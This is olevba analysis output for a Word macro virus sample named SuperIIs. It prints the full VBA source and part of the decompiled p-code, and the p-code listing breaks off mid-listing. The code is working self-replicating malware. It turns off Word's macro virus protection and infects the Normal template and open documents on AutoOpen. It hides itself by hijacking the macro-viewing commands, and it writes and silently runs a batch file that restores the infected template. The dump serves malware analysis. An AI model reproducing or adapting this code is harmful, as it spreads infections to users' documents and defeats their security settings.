olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.SuperIIs
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.SuperIIs - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: ./Virus.MSWord.SuperIIs - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo eb
'MyName=SuperIISv1.0
Call Flitnic
eb:
End Sub
Sub ViewVbCode()
On Error GoTo NoDoc
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
'Clean Activedocument:
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
Acd = 1
Exit For
End If
Next t
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
'Clean NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 2 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
NormT = 1
Exit For
End If
Next t2
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
l = ""
On Error GoTo 0
On Error GoTo eb
NormalTemplate.OpenAsDocument
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
notemp:
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.deletelines 1, a
NormAt = False
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
Print #1, "If not exist " & Left(NormalTemplate.FullName, l) & "~$Normal.dot goto start"
Print #1, "Goto Begin"
Print #1, ":Start"
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Close #1
If NormAt = True Then GoTo NoBat
a = Shell(windir & "\System\lo.bat", 0)
NoBat:
For i = 1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
NormalTemplate.Saved = True
Next i
esub:
eb:
NormalTemplate.Saved = True
Application.ShowVisualBasicEditor = True
NoDocL:
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
On Error GoTo NoDoc
'Save ActiveDocument:
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
FullCodeD = FullCodeD & l & Chr(13)
Next ii
End If
'Clean Activedocument:
a = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
'Save NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
FullCodeN = FullCodeN & l & Chr(13)
Next iiii
End If
'Clean NormalTemplate:
l = ""
On Error GoTo 0
On Error GoTo eb
a = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, a
NormalTemplate.Saved = True
esub:
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
a = GetAttr(NormalTemplate.FullName)
If a = 33 Then a = 1
If a = 1 Then GoTo eb
eb:
NormalTemplate.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf = True
If Application.ShowVisualBasicEditor = True Then ReInf = False
Reinfection:
If ReInf = True Then
'Reinfection:
Acd = 0
NormT = 0
If NormT <> 1 Then
NormalTemplate.OpenAsDocument
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
Close #1
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For inn = 2 To ms
a = NormalTemplate.VBProject.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
NormalTemplate.VBProject.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
End If
i = 1
If NormAt <> True Then NormalTemplate.Save
notemp:
If Acd <> 1 Then
Close
look2:
a = Application.Documents.Count
If a < 1 Then GoTo NoDocL
ms = ActiveDocument.VBProject.VBComponents.Count
For inn2 = 2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoDocL:
Else
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.deletelines 1, a
NormalTemplate.OpenAsDocument
NormAt = False
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
Print #1, "If not exist " & Left(NormalTemplate.FullName, l) & "~$Normal.dot goto start"
Print #1, "Goto Begin"
Print #1, ":Start"
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Close #1
If NormAt = True Then GoTo NoBat
a = Shell(windir & "\System\lo.bat", 0)
NoBat:
For i = 1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
NormalTemplate.Saved = True
Next i
End If
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub Flitnic()
Begin:
On Error GoTo eb
NormAt = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
On Error GoTo NoInf
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
Next ii
End If
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
Next iiii
End If
If NormT <> 1 Then
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
Close #1
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For inn = 2 To ms
a = NormalTemplate.VBProject.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
NormalTemplate.VBProject.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
notemp:
End If
i = 1
If Acd <> 1 Then
Close
look2:
ms = ActiveDocument.VBProject.VBComponents.Count
For inn2 = 2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoInf:
eb:
d = Dir(NormalTemplate.FullName)
If d = "" Then Exit Sub
If NormAt = True Then
SetAttr (NormalTemplate.FullName), vbNormal
Else
NormalTemplate.Save
End If
'First ever used this kind of Stealth
'Written by Flitnic. I haven't yet included a payload!
End Sub







-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.SuperIIs
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul1 - 23967 bytes
' Line #0:
' 	FuncDefn (Sub AuToOpEn())
' Line #1:
' 	OnError eb 
' Line #2:
' 	QuoteRem 0x0000 0x0013 "MyName=SuperIISv1.0"
' Line #3:
' 	ArgsCall (Call) Flitnic 0x0000 
' Line #4:
' 	Label eb 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub ViewVbCode())
' Line #7:
' 	OnError NoDoc 
' Line #8:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #9:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #10:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #12:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #14:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Loop 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #18:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x0015 "Clean Activedocument:"
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #21:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #22:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #23:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #24:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.0"
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #26:
' 	ExitFor 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #31:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #32:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #33:
' 	Label NoDoc 
' Line #34:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #35:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #36:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #37:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #38:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #39:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.0"
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #41:
' 	ExitFor 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #45:
' 	LitStr 0x0000 ""
' 	St l 
' Line #46:
' 	OnError (GoTo 0) 
' Line #47:
' 	OnError eb 
' Line #48:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #49:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #50:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #51:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #52:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Label notemp 
' Line #56:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #58:
' 	LitVarSpecial (False)
' 	St NormAt 
' Line #59:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAt 
' Line #60:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #61:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #62:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #63:
' 	CloseAll 
' Line #64:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #66:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	FnLen 
' 	St l 
' Line #67:
' 	Ld l 
' 	LitDI2 0x000A 
' 	Sub 
' 	St l 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "If not exist "
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld l 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	LitStr 0x0017 "~$Normal.dot goto start"
' 	Concat 
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Goto Begin"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Start"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld windir 
' 	LitStr 0x001D "\command\Attrib.exe -s -h -r "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Copy/y "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\System\lo.sys "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld windir 
' 	LitStr 0x001D "\command\Attrib.exe -s -h -r "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Copy/y "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\System\lo.sys "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld windir 
' 	LitStr 0x001D "\command\Attrib.exe -s -h -r "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Copy/y "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\System\lo.sys "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #78:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoBat 
' 	EndIf 
' Line #79:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #80:
' 	Label NoBat 
' Line #81:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #82:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #83:
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #84:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #86:
' 	Label esub 
' Line #87:
' 	Label eb 
' Line #88:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #89:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #90:
' 	Label NoDocL 
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub ToolsMacro())
' Line #95:
' 	OnError NoDoc 
' Line #96:
' 	QuoteRem 0x0000 0x0014 "Save ActiveDocument:"
' Line #97:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #98:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #99:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #100:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #101:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.0"
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #103:
' 	ExitFor 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #106:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitStr 0x000C "Sub AuToOpEn"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #108:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #109:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #110:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #111:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #112:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #113:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #114:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	QuoteRem 0x0000 0x0015 "Clean Activedocument:"
' Line #117:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
